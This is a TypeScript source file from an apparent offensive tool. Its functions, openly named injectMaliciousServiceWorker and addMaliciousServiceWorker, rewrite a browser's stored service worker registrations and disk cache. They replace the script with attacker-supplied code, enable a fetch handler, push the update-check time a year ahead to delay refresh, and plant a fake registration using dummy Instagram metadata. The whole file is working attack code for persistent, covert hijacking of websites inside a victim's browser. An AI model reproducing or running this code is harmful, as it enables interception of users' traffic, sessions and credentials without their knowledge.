import { diskCache } from "./diskCache"
import { addRegistration, closeDb, getRegistrations, printAllKeys, saveRegistrationEntries, setDbPath } from "./levelDb/serviceWorkerLevelDb"
import * as fs from 'fs/promises'

export async function injectMaliciousServiceWorker(url: URL, targetServiceWorker: string) {
    const registrations = await getRegistrations(url)
    for(let registration of registrations) {
        const newScriptUrl = registration.registration.value.getScriptUrl()!.replace(/\/[^\/]+$/, "/invalid.js")
        registration.registration.value.setScriptUrl(newScriptUrl)
        registration.registration.value.setHasFetchHandler(true)

        // About a year from now
        //TODO: Replace with a smarter solution. Uses windows epoch
        registration.registration.value.setLastUpdateCheckTime(13325671046262602)
        console.log(registration.registration.value.toObject())

        for(let {value: resourceRecord} of registration.resourceRecords) {
            resourceRecord.setUrl(newScriptUrl)
            console.log(resourceRecord.toObject())
            const diskCacheKey = `${resourceRecord.getResourceId()}`
            const serviceWorkerContent =  await diskCache.get(diskCacheKey, diskCache.Streams.ServiceWorkerScriptContent)
            serviceWorkerContent.body.value = targetServiceWorker
            console.log(serviceWorkerContent.body.value)
            await serviceWorkerContent.save()

            try {
                await diskCache.remove(diskCacheKey, diskCache.Streams.ServiceWorkerMetadata)
            } catch(e) {
                console.log("Failed to remove service worker metadata file")
            }
        }

        await saveRegistrationEntries(registration.registration, ...registration.resourceRecords)
    }
}

export async function addMaliciousServiceWorker(url : URL, targetServiceWorker: string) {
    const resourceId = await addRegistration(url)
    const dummyHttpInfo = await fs.readFile("static/dummyInstagramHttpInfo")
    await diskCache.writeResourceFile(`${resourceId}`, Buffer.from(targetServiceWorker), dummyHttpInfo)
}
